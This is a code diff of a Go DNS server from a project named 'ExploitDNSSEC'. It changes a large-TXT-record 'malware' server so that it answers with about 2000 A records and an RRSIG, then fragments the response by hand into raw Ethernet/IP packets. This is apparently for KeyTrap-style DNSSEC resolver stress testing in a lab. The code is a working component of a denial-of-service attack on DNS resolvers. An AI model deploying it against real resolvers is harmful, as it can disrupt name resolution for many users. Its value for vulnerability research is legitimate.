@@ -1,23 +1,25 @@
-/*
-@Author : idealeer&4stra
-@File : LargeRRSET.go
-@Software: GoLand
-@Time : 6/2/2022 09:31
-
-	: 10/14/2024 16:28
-	: 10/14/2024 20:03
-@Description:
-	Malfare DNS Server which can response large RRSET.
-*/
+/**
+ * @Project :   ExploitDNSSEC
+ * @File    :   dns_auth_frag.go
+ * @Contact :	tochus@163.com
+ * @License :   (C)Copyright 2024
+ *
+ * @Modify Time        @Author     @Version    @Description
+ * ----------------    --------    --------    -----------
+ * 4/8/23 5:34 PM      idealeer    0.0         None
+ * 14/10/24 16:28	   4stra       0.1.0       Enable DNSSEC
+ * 15/10/24 11:10      4stra       0.2.0       Ethnet Fragmentation
+ */
 
 package main
 
 import (
-	"crypto/rand"
 	"encoding/base64"
 	"fmt"
+	"math/rand"
 	"net"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 
@@ -27,38 +29,62 @@ import (
 	"github.com/tochusc/gopacket/pcap"
 )
 
-// LargeRRSET参数
-var txtRecordByteLenC = 64000
-var txtLoadC = genTXTLoadC(txtRecordByteLenC)
+// A记录数量
+var aRecordNumC = 2000
+var aRecordLoadC = genAnswerLoad(aRecordNumC)
 
-func genRandomByte(byteLen int) []byte {
-	b := make([]byte, byteLen)
-	_, err := rand.Read(b)
-	if err != nil {
-		fmt.Println("Error: ", err)
-		os.Exit(1)
-	}
-	return b
-}
+func genAnswerLoad(aNum int) []layers.DNSResourceRecord {
+	answers := make([]layers.DNSResourceRecord, 0)
 
-func genTXTLoadC(pktSz int) [][]byte {
-	txts := make([][]byte, 0)
-	batch := pktSz / 255
-	mod := pktSz % 255
-	for i := 0; i < batch; i++ {
-		txts = append(txts, genRandomByte(255))
+	rep := aNum / (256 - 2)
+	mod := aNum % (256 - 2)
+
+	for i := 0; i < rep; i++ {
+		for j := 2; j < 255; j++ {
+			answers = append(answers, layers.DNSResourceRecord{
+				Name:  []byte("www.keytrap.test"),
+				Type:  layers.DNSTypeA,
+				Class: layers.DNSClassIN,
+				TTL:   uint32(globalTTLC),
+				IP:    net.ParseIP("10.10." + strconv.Itoa(i) + "." + strconv.Itoa(j)),
+			})
+		}
 	}
 	if mod > 0 {
-		txts = append(txts, genRandomByte(mod))
+		for j := 2; j < mod+2; j++ {
+			answers = append(answers, layers.DNSResourceRecord{
+				Name:  []byte("www.keytrap.test"),
+				Type:  layers.DNSTypeA,
+				Class: layers.DNSClassIN,
+				TTL:   uint32(globalTTLC),
+				IP:    net.ParseIP("10.10." + strconv.Itoa(rep) + "." + strconv.Itoa(j)),
+			})
+		}
 	}
-	return txts
+	answers = append(answers, layers.DNSResourceRecord{
+		Name:       []byte("www.keytrap.test"),
+		Type:       layers.DNSTypeRRSIG,
+		Class:      layers.DNSClassIN,
+		TTL:        uint32(globalTTLC),
+		DataLength: rrsig["www.keytrap.test"].Len(),
+		Data:       rrsig["www.keytrap.test"].Serialize(),
+	})
+
+	return answers
 }
 
 // DNS服务器配置相关变量
 var (
-	serverIPC   = "10.10.3.3"
-	srcPortC    = 53
-	deviceC     = "eth0"
+	serverIPC = "10.10.3.3"
+	srcPortC  = 53
+	deviceC   = "eth0"
+
+	// 以太网最大传输单元：发送方所能接受的最大载荷大小
+	mtuC = 1500
+	// 以太网帧最大长度：mtuC + ethHeaderLenC = 1514字节
+	ethHeaderLenC = 14
+	ipHeaderLenC  = 20
+
 	serverMACC  = net.HardwareAddr{0x02, 0x42, 0x0a, 0x0a, 0x03, 0x03}
 	handleSend  *pcap.Handle
 	err         error
@@ -141,7 +167,7 @@ var rrsig = map[string]*RRSIG{
 	"TXT": {
 		TypeCovered: uint16(layers.DNSTypeTXT),
 		Algorithm:   14,
-		Labels:      3,
+		Labels:      2,
 		OriginalTTL: globalTTL,
 		Expiration:  expiration,
 		Inception:   inception,
@@ -246,6 +272,42 @@ func (rrsig *RRSIG) Serialize() []byte {
 	b = append(b, byte(rrsig.KeyTag>>8), byte(rrsig.KeyTag))
 	b = append(b, rrsig.SignerName...)
 	b = append(b, rrsig.Signature...)
+
+	// 调试用
+	// for index, rbyte := range b {
+	// 	switch index{
+	// 		case 0:
+	// 			fmt.Println("TypeCovered:")
+	// 		case 2:
+	// 			fmt.Println()
+	// 			fmt.Println("Algorithm:")
+	// 		case 3:
+	// 			fmt.Println()
+	// 			fmt.Println("Labels:")
+	// 		case 4:
+	// 			fmt.Println()
+	// 			fmt.Println("OriginalTTL:")
+	// 		case 8:
+	// 			fmt.Println()
+	// 			fmt.Println("Expiration:")
+	// 		case 12:
+	// 			fmt.Println()
+	// 			fmt.Println("Inception:")
+	// 		case 16:
+	// 			fmt.Println()
+	// 			fmt.Println("KeyTag:")
+	// 		case 18:
+	// 			fmt.Println()
+	// 			fmt.Println("SignerName:")
+	// 		case 18+len(rrsig.SignerName):
+	// 			fmt.Println()
+	// 			fmt.Println("Signature:")
+
+	// 	}
+	// 	fmt.Printf("%02x ", rbyte)
+	// }
+	// fmt.Println()
+
 	return b
 }
 
@@ -286,6 +348,9 @@ type DNSSECRR interface {
 func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort, qname string, qtype layers.DNSType, txid uint16) {
 	fmt.Printf("%s : fm %s query %s %s\n", time.Now().Format(time.ANSIC), dstIP, qname, qtype.String())
 
+	// Generate a random IPID value for all fragments
+	ipID := uint16(rand.Intn(65536)) // Generate a random number between 0 and 65535
+
 	ethernetLayer := &layers.Ethernet{
 		BaseLayer:    layers.BaseLayer{},
 		SrcMAC:       serverMACC,
@@ -300,7 +365,7 @@ func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort,
 		IHL:        0,
 		TOS:        0,
 		Length:     0,
-		Id:         0,
+		Id:         ipID,
 		Flags:      0,
 		FragOffset: 0,
 		TTL:        64,
@@ -328,7 +393,7 @@ func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort,
 
 	var dnsLayer *layers.DNS
 	switch qtype {
-	case layers.DNSTypeTXT:
+	case layers.DNSTypeA:
 		if _, ok := rrsig[qname]; !ok {
 			// 未配置的域名，返回NXDOMAIN
 			dnsLayer = &layers.DNS{
@@ -364,6 +429,9 @@ func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort,
 				Z:            0,
 				ResponseCode: 0,
 				QDCount:      1,
+				ANCount:      uint16(len(aRecordLoadC)),
+				NSCount:      2,
+				ARCount:      2,
 				Questions: []layers.DNSQuestion{
 					{
 						Name:  []byte(qname),
@@ -371,24 +439,7 @@ func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort,
 						Class: layers.DNSClassIN,
 					},
 				},
-				Answers: []layers.DNSResourceRecord{
-					{
-						Name:  []byte(qname),
-						Type:  layers.DNSTypeTXT,
-						Class: layers.DNSClassIN,
-						TTL:   uint32(globalTTLC),
-						TXTs:  txtLoadC,
-					},
-					// RRSIG
-					{
-						Name:       []byte(qname),
-						Type:       layers.DNSTypeRRSIG,
-						Class:      layers.DNSClassIN,
-						TTL:        uint32(globalTTLC),
-						DataLength: rrsig["TXT"].Len(),
-						Data:       rrsig["TXT"].Serialize(),
-					},
-				},
+				Answers: aRecordLoadC,
 				Authorities: []layers.DNSResourceRecord{
 					{
 						Name:  []byte("keytrap.test"),
@@ -511,31 +562,107 @@ func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort,
 		}
 	}
 
-	buffer := gopacket.NewSerializeBuffer()
+	// DNS层序列化
+	dnsBuffer := gopacket.NewSerializeBuffer()
 	options := gopacket.SerializeOptions{
 		ComputeChecksums: true,
 		FixLengths:       true,
 	}
-
-	err = gopacket.SerializeLayers(
-		buffer,
-		options,
-		ethernetLayer,
-		ipv4Layer,
-		udpLayer,
-		dnsLayer,
-	)
+	err = dnsLayer.SerializeTo(dnsBuffer, options)
 	if err != nil {
-		fmt.Println("Error: ", err)
+		fmt.Println("DNS Layer Serialzing Error: ", err)
 		os.Exit(1)
 	}
+	dnsPayload := dnsBuffer.Bytes()
+	fmt.Printf(
+		"%s : DNS layer size = %d\n", time.Now().Format(time.ANSIC), len(dnsPayload),
+	)
 
-	outgoingPacket := buffer.Bytes()
-
-	err = handleSend.WritePacketData(outgoingPacket)
+	// UDP层序列化
+	udpBuffer := gopacket.NewSerializeBuffer()
+	err = gopacket.SerializeLayers(
+		udpBuffer,
+		options,
+		udpLayer,
+		gopacket.Payload(dnsPayload),
+	)
 	if err != nil {
-		fmt.Println("Error: ", err)
+		fmt.Println("UDP Layer Serialzing Error: ", err)
 		os.Exit(1)
+	}
+	udpPayload := udpBuffer.Bytes()
+	fmt.Printf(
+		"%s : UDP layer size = %d\n", time.Now().Format(time.ANSIC), len(udpPayload),
+	)
+
+	// 计算每个分片的载荷大小：MTU - IP头部长度
+	payloadSize := mtuC - ipHeaderLenC
+	// 确保每个分片的载荷大小是8的倍数
+	payloadSize = payloadSize &^ 7
+
+	// 分片
+	fragments := make([][]byte, 0)
+	for i := 0; i < len(udpPayload); i += payloadSize {
+		end := i + payloadSize
+		if end > len(udpPayload) {
+			end = len(udpPayload)
+		}
+		fragments = append(fragments, udpPayload[i:end])
+	}
+
+	// 发送分片
+	for i, fragment := range fragments {
+		// 设置IP层长度
+		ipv4Layer.Length = uint16(ipHeaderLenC + len(fragment))
+
+		// 设置IP层标志
+		if i == len(fragments)-1 {
+			ipv4Layer.Flags = 0
+		} else {
+			ipv4Layer.Flags = layers.IPv4MoreFragments
+		}
+
+		// 计算偏移量
+		ipv4Layer.FragOffset = uint16(i * payloadSize / 8)
+
+		// IP层序列化
+		ipv4Buffer := gopacket.NewSerializeBuffer()
+		err = gopacket.SerializeLayers(
+			ipv4Buffer,
+			options,
+			ipv4Layer,
+			gopacket.Payload(fragment),
+		)
+		if err != nil {
+			fmt.Println("IPv4 Layer Serialzing Error: ", err)
+			os.Exit(1)
+		}
+		ipv4Payload := ipv4Buffer.Bytes()
+
+		// 以太网层序列化
+		ethernetBuffer := gopacket.NewSerializeBuffer()
+		err = gopacket.SerializeLayers(
+			ethernetBuffer,
+			options,
+			ethernetLayer,
+			gopacket.Payload(ipv4Payload),
+		)
+		if err != nil {
+			fmt.Println("Ethernet Layer Serialzing Error: ", err)
+			os.Exit(1)
+		}
+
+		// 发送数据包
+		outgoingPacket := ethernetBuffer.Bytes()
+		err = handleSend.WritePacketData(outgoingPacket)
+		if err != nil {
+			fmt.Println("Error sending packet: ", err)
+			os.Exit(1)
+		}
+
+		fmt.Printf(
+			"%s : frag#%d with size %d\n", time.Now().Format(time.ANSIC), i+1, len(fragment),
+		)
 	}
 
 	fmt.Printf(
